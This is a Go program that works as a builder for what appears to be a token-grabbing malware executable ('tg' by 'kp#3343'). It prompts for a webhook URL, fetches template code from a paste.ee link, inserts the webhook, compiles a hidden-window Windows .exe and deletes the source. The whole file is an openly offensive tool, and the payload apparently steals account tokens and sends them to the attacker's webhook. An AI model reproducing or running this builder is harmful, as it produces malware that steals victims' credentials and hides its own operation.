package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

func main() {
	var banner string = `              
     _                      
    | |_ ___    ___ ___ ___ 
    |  _| . |  | . | -_|   |
    |_| |_  |  |_  |___|_|_|
        |___|  |___|  by kp#3343

`
	fmt.Println(banner)
	fmt.Print("> Enter your Webhook URL: ")
	var url string
	fmt.Scanln(&url)
	fmt.Print("> Enter the executable name: ")
	var outputName string
	fmt.Scanln(&outputName)
	fmt.Println(" -------------------------- ")
	fmt.Println("\n # Initializing generation")
	fmt.Println(" * Executing HTTP GET")
	resp, err := http.Get("https://paste.ee/r/QOrx9") // in order to reduce the code length

	if err != nil {
		log.Fatal(" ! Error while trying to HTTP GET -> ", err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(" ! Error while reading HTTP GET body -> ", err)
	}

	code := string(body)
	fmt.Println(" * HTTP GET done")
	fmt.Println("\n * Creating 'tg.go' file")
	actualCode := strings.Replace(code, "%s", url, -1)
	errr := ioutil.WriteFile("tg.go", []byte(actualCode), 0777)
	if errr != nil {
		log.Fatal(" ! Error while writing 'tg.go' file -> ", err)
	}
	fmt.Println(" * 'tg.go' file created")
	fmt.Println("\n * Compiling to .exe")
	cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui", "-o", outputName+".exe", "tg.go")
	cmd.Run()
	fmt.Println(" * Compiled to .exe")
	fmt.Println("\n * Removing 'tg.go' file")
	err = os.Remove("tg.go")
	if err != nil {
		log.Fatal(" ! Error while deleting 'tg.go' file -> ", err)
	}
	fmt.Println(" * 'tg.go' file deleted")
	fmt.Println("\n # Generation successfully finished")
	fmt.Println("\n -------------------------- ")
	fmt.Scanln()

}
